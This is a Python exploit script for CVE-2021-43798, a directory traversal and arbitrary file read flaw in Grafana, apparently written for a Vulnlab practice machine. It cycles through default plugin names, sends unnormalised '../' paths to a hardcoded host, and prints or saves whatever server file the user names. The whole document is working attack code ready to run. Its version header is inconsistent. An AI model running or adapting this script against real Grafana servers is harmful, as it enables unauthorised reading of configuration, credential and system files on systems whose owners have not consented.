#!/usr/bin/python3

# Exploit Title: Grafana versions >= v8.3.0 Directory Traversal / Arbituary File Read
# Date: 2023-07-18
# Exploit Author: nuker
# Vendor Homepage: (https://grafana.com/)
# Version: v8.0.0
# Tested on: Debian (https://wiki.vulnlab.com/hints-and-walkthroughs/easy/data)
# CVE : CVE-2021-43798

import requests
import argparse
from random import choice
from requests import Request
from colorama import Fore, Style, init

init(autoreset=True)

parser = argparse.ArgumentParser()
parser.add_argument("-f", type=str, required=True, help="file to read")
parser.add_argument("-s", required=False, action='store_true', help="save file locally")
args = parser.parse_args()

red = Fore.RED
blu = Fore.BLUE
yel = Fore.YELLOW
gre = Fore.GREEN
cya = Fore.CYAN
bla = Fore.BLACK

dim = Style.DIM

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def cve(file: str) -> None:
	

	headers = {}
	headers["User-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"

	with requests.Session() as sess:
		while True:
			try:
				plugin = choice(plugin_list)
				url = "http://data.vl:3000/public/plugins/" + f"{plugin}" + f"/../../../../../../../../..{file}"
				final = Request("GET", url, headers=headers).prepare()
				final.url = url
				r = sess.send(final, verify=False)
			except Exception as e:
				print(e)
			if r.status_code != 200:
				print(dim + red + f"[!] Error {r.status_code} (code not 200)\n")
				break
			elif "Not found" in r.text:
				print(dim + yel + "[!] Plugin error or plugin not found")
				break
			elif r.status_code == 200:
				if args.s:
					print(dim + yel + f"[*] Saving {file}")
					with open(f"./graf_file","w") as new_file:
						new_file.write(r.text)
					print(dim + yel + f"[*] Saved {file}")
					break
				else:
					print(dim + yel + "[*] end of content")
					print(r.text)
					print(dim + yel + f"[*] content of {file}")
					break
			else:
				print(dim + red + "Figure it out bro.")

def main():
	file = str(args.f)
	cve(file)

if __name__ == "__main__":
	main()